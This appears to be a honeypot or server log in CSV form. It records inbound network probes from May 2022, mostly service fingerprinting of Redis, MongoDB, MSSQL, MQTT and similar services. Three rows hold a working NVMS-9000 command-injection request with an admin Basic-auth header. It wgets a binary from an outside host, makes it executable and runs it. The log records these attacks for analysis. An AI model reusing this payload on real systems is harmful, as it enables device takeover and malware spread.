ID,ADDR,VALUE,TIME
REQ_47_P82,"('128.14.233.47', 31634)",b':\x00\x00\x00/\x00\x00\x00\x02\x00\x00@\x02\x0f\x00\x01\x00=\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00/\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',2022-05-25 11:47:37.091255
REQ_48_P82,"('128.14.233.47', 32126)",b'JRMI\x00\x02K',2022-05-25 11:47:39.396476
REQ_49_P82,"('128.14.233.47', 32554)",b'\x01\x00\x00\xfd\xce\xfa\x0b\xb0\xa0\x00\x00\x00MMS\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x12\x00\x00\x00\x01\x00\x03\x00\xf0\xf0\xf0\xf0\x0b\x00\x04\x00\x1c\x00\x03\x00N\x00S\x00P\x00l\x00a\x00y\x00e\x00r\x00/\x009\x00.\x000\x00.\x000\x00.\x002\x009\x008\x000\x00;\x00 \x00{\x000\x000\x000\x000\x00A\x00A\x000\x000\x00-\x000\x00A\x000\x000\x00-\x000\x000\x00a\x000\x00-\x00A\x00A\x000\x00A\x00-\x000\x000\x000\x000\x00A\x000\x00A\x00A\x000\x00A\x00A\x000\x00}\x00\x00\x00\xe0m\xdf_',2022-05-25 11:47:41.696227
REQ_50_P82,"('128.14.233.47', 33030)","b'\x00Z\x00\x00\x01\x00\x00\x00\x016\x01,\x00\x00\x08\x00\x7f\xff\x7f\x08\x00\x00\x00\x01\x00 \x00:\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x004\xe6\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00(CONNECT_DATA=(COMMAND=version))'",2022-05-25 11:47:44.048972
REQ_51_P82,"('128.14.233.47', 33690)",b'\x12\x01\x004\x00\x00\x00\x00\x00\x00\x15\x00\x06\x01\x00\x1b\x00\x01\x02\x00\x1c\x00\x0c\x03\x00(\x00\x04\xff\x08\x00\x01U\x00\x00\x00MSSQLServer\x00H\x0f\x00\x00',2022-05-25 11:47:46.432192
REQ_52_P82,"('128.14.233.47', 34208)",b'stats\r\n',2022-05-25 11:47:48.787230
REQ_53_P82,"('128.14.233.47', 34768)",b'\x00\x03\x00\x01\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x0f\x00',2022-05-25 11:47:51.196225
REQ_54_P82,"('128.14.233.47', 35350)",b'A\x00\x00\x00:0\x00\x00\xff\xff\xff\xff\xd4\x07\x00\x00\x00\x00\x00\x00test.$cmd\x00\x00\x00\x00\x00\xff\xff\xff\xff\x1b\x00\x00\x00\x01serverStatus\x00\x00\x00\x00\x00\x00\x00\xf0?\x00',2022-05-25 11:47:53.530634
REQ_55_P82,"('128.14.233.47', 36174)",b'*1\r\n$4\r\ninfo\r\n',2022-05-25 11:47:55.838018
REQ_56_P82,"('128.14.233.47', 36648)",b'GIOP\x01\x00\x01\x00$\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00abcdef\x00\x00\x04\x00\x00\x00get\x00\x00\x00\x00\x00',2022-05-25 11:47:58.169570
REQ_57_P82,"('128.14.233.47', 36950)",b'\x10\x10\x00\x04MQTT\x04\x02\x00\x1e\x00\x04nmap',2022-05-25 11:48:00.539267
REQ_58_P82,"('205.210.31.142', 44125)","b'GET / HTTP/1.1\r\nHost: 54.91.30.20:82\r\nUser-Agent: Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com\r\n\r\n'",2022-05-25 19:42:05.928491
REQ_59_P82,"('175.162.144.167', 48723)","b'POST /editBlackAndWhiteList HTTP/1.1\r\nAccept-Encoding: identity\r\nContent-Length: 644\r\nAccept-Language: en-us\r\nHost: 54.91.30.20:8000\r\nAccept: */*\r\nUser-Agent: Mozila/5.0\r\nConnection: close\r\nCache-Control: max-age=0\r\nContent-Type: text/xml\r\nAuthorization: Basic YWRtaW46ezEyMjEzQkQxLTY5QzctNDg2Mi04NDNELTI2MDUwMEQxREE0MH0=\r\n\r\n<?xml version=""1.0"" encoding=""utf-8""?><request version=""1.0"" systemType=""NVMS-9000"" clientType=""WEB""><types><filterTypeMode><enum>refuse</enum><enum>allow</enum></filterTypeMode><addressType><enum>ip</enum><enum>iprange</enum><enum>mac</enum></addressType></types><content><switch>true</switch><filterType type=""filterTypeMode"">refuse</filterType><filterList type=""list""><itemType><addressType type=""addressType""/></itemType><item><switch>true</switch><addressType>ip</addressType><ip>$(cd${IFS}/tmp;wget${IFS}http://92.118.230.134/garm7${IFS}-O-${IFS}>GSec;chmod${IFS}777${IFS}GSec;./GSec${IFS}tvt)</ip></item></filterList></content></request>\x11'",2022-05-25 22:36:10.889936
REQ_60_P82,"('144.255.31.171', 41358)",b'',2022-05-25 22:36:11.749067
REQ_61_P82,"('144.255.31.171', 41446)","b'HEAD http://110.242.68.4/ HTTP/1.1\r\nHost: 110.242.68.4\r\nProxy-Authorization: Basic Og==\r\nProxy-Connection: Keep-Alive\r\nUser-Agent: Mozilla/5.01717655 Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20\r\nConnection: keep-alive\r\nAccept-Language: zh-CN,zh;q=0.8\r\nAccept-Encoding: gzip, deflate, sdch\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nCache-Control: max-age=0\r\n\r\n'",2022-05-25 22:36:11.978428
REQ_62_P82,"('119.90.42.91', 57340)",b'\x02',2022-05-25 22:48:33.942316
REQ_63_P82,"('119.90.42.91', 58282)",b'hello',2022-05-25 22:48:34.386651
REQ_64_P82,"('119.90.42.91', 33222)","b'\x9eaQ[Q""?;\x077\x06(3V4\x18\x04,WR\r8S\x0f2\x080X1\x169\x14\x12$U""\x10\x00YV=aaaa\x89f\xcb`aaYaaaa\xe2X\xa4daaaa`~\xeaiaaaaaab\x0c\xf0\x0c\x0e\xbbQu\xe4\x9e\xeb\x84.\xcc\xb5\xa7\xdf\x18\x14S@\xf4\xe7m\xb3#sd\xb3\xcc\x0b1\x05A!\xdb\xf15(I\xcd\xb2\x9f\x9a\r7\x08\n\xa4f\x8a\xbb\x86]\x96\xb9\xdb\x1f\xa3Z\x82\x8a`\xabH\xac\xdaW\xd3\xfah:\xef?\xdf\xde\\\x1e\x9a\x88\x7fb.\xa469\xc4\xe7@+\xa6\x8ad\xce\xa4gI\xc4\xc3}\xf8\xf8\xf8\xdb]:X\xb6T\xf4\x08\xad\xd5Y\x06J\xd1\xf9\xd0?\x92D\x91\xb4\x13\xcc\xfa\xd3v\r\xfa\xe0\x17\xeb`\xb2\x05[\x04S\xf9\xe8t\xa4\xbf\r\x97\xf9d\x9c\xe8\xb6*\x90\\NjUmsSO\xcb\x9cp\xa4\x148w\xb4G\xa4\x08\x14w\xf1\xe7^\x89\x9cq\x03;\\\x19\x90\xb5nb`\xc85dd\xc5\x98\xcf\x04c[F\xda\x80\xa1\x1an\xf7x\xb6\xac\xde\x9a\x9d W\x97\x8e\xdc\xbfK>u\xdd+\xca\x1fQ\x94d^o\x02`\xa2v\x8c\xf5RkF?\xf7\xa5\x02@\x0c\xda\x8f\xc4\x14iX}o\xeb\xad3\x8b\x07""ER,\xc3I\xed\x06\xfe\xd1\x14\xbc\x8d\x16\x8c&\x93Wx\x07\xd0\x16g?\x8dV\xfe\xb1\x92\x12#ItNt""D\xba\x1b\xf6\xf2\xde~\'\xf5\xd7\xbc\xf3\x06\x9f\xab\xa8\xc3\xc9\xa9<\xfaV\xcec\xb0\xc8\xab\xa1a\x98lSx>\\\x001\rU\xddt\xe3>\x14\x18\x18p>C\xd6\x0f\x93\xea\xb8\x85st\xb7TRm\xfbAV+\xb1lc\xe4\xb0\x80\x89,U\x9c\xa3\x18\xd6\xc4\xb9\xa0\xf5[\xb5\x145\xba\xd0\x9a\xef\x8f[\x81\x80\xbe\x92\x9e\r\xd14d-\xc7\xe1$t\xb1\xd5\xf2X\xfe\xae\x9ea\x01\xa3\xc6\x1a\x1ccaa'",2022-05-25 22:48:35.920356
REQ_65_P82,"('119.90.42.91', 36742)",b'hello',2022-05-25 22:48:37.446778
REQ_66_P82,"('119.90.42.91', 40336)","b'+.\x85L\xbe\x85\x8dR,\x9d\x08\xfa\xc1""\xc1\t\xbbx\xcc\x91\xf6\xf9\xa0\x0e{;\xa1\xc7\xc7\x16\xb9\x93\x84\x11\x9dV\x99\xe7~8|uB|\xf3\xb7s\xff\x07\xf1\xfa\xb1\x0f47\x9e\xa7\xd4\rd\xa17\xb2x\x93j\x8c\x8c\xd8\xfe\x05x\xc9J\x93\xb8X~\xc6t\x02\x0f\xc8\xcb\xfe2\xcco\xd2\x17 *\xbfK\xc0\x10\xf4p2\x8cz\xf4%\x03\xbcP\x99\xee\x80\x9e\xfe\xc7c5\x8a*\xb9?\xc4\xe6\xa5+\xa4'",2022-05-25 22:48:38.967427
REQ_67_P82,"('220.88.249.44', 40644)","b'POST /editBlackAndWhiteList HTTP/1.1\r\nAccept-Encoding: identity\r\nContent-Length: 644\r\nAccept-Language: en-us\r\nHost: 54.91.30.20:82\r\nAccept: */*\r\nUser-Agent: Mozila/5.0\r\nConnection: close\r\nCache-Control: max-age=0\r\nContent-Type: text/xml\r\nAuthorization: Basic YWRtaW46ezEyMjEzQkQxLTY5QzctNDg2Mi04NDNELTI2MDUwMEQxREE0MH0=\r\n\r\n<?xml version=""1.0"" encoding=""utf-8""?><request version=""1.0"" systemType=""NVMS-9000"" clientType=""WEB""><types><filterTypeMode><enum>refuse</enum><enum>allow</enum></filterTypeMode><addressType><enum>ip</enum><enum>iprange</enum><enum>mac</enum></addressType></types><content><switch>true</switch><filterType type=""filterTypeMode"">refuse</filterType><filterList type=""list""><itemType><addressType type=""addressType""/></itemType><item><switch>true</switch><addressType>ip</addressType><ip>$(cd${IFS}/tmp;wget${IFS}http://92.118.230.134/garm7${IFS}-O-${IFS}>GSec;chmod${IFS}777${IFS}GSec;./GSec${IFS}tvt)</ip></item></filterList></content></request>\x11'",2022-05-26 07:37:44.865032
REQ_68_P82,"('14.42.36.52', 41589)","b'POST /editBlackAndWhiteList HTTP/1.1\r\nAccept-Encoding: identity\r\nContent-Length: 644\r\nAccept-Language: en-us\r\nHost: 54.91.30.20:8080\r\nAccept: */*\r\nUser-Agent: Mozila/5.0\r\nConnection: close\r\nCache-Control: max-age=0\r\nContent-Type: text/xml\r\nAuthorization: Basic YWRtaW46ezEyMjEzQkQxLTY5QzctNDg2Mi04NDNELTI2MDUwMEQxREE0MH0=\r\n\r\n<?xml version=""1.0"" encoding=""utf-8""?><request version=""1.0"" systemType=""NVMS-9000"" clientType=""WEB""><types><filterTypeMode><enum>refuse</enum><enum>allow</enum></filterTypeMode><addressType><enum>ip</enum><enum>iprange</enum><enum>mac</enum></addressType></types><content><switch>true</switch><filterType type=""filterTypeMode"">refuse</filterType><filterList type=""list""><itemType><addressType type=""addressType""/></itemType><item><switch>true</switch><addressType>ip</addressType><ip>$(cd${IFS}/tmp;wget${IFS}http://92.118.230.134/garm7${IFS}-O-${IFS}>GSec;chmod${IFS}777${IFS}GSec;./GSec${IFS}tvt)</ip></item></filterList></content></request>\x11'",2022-05-29 20:32:39.870030
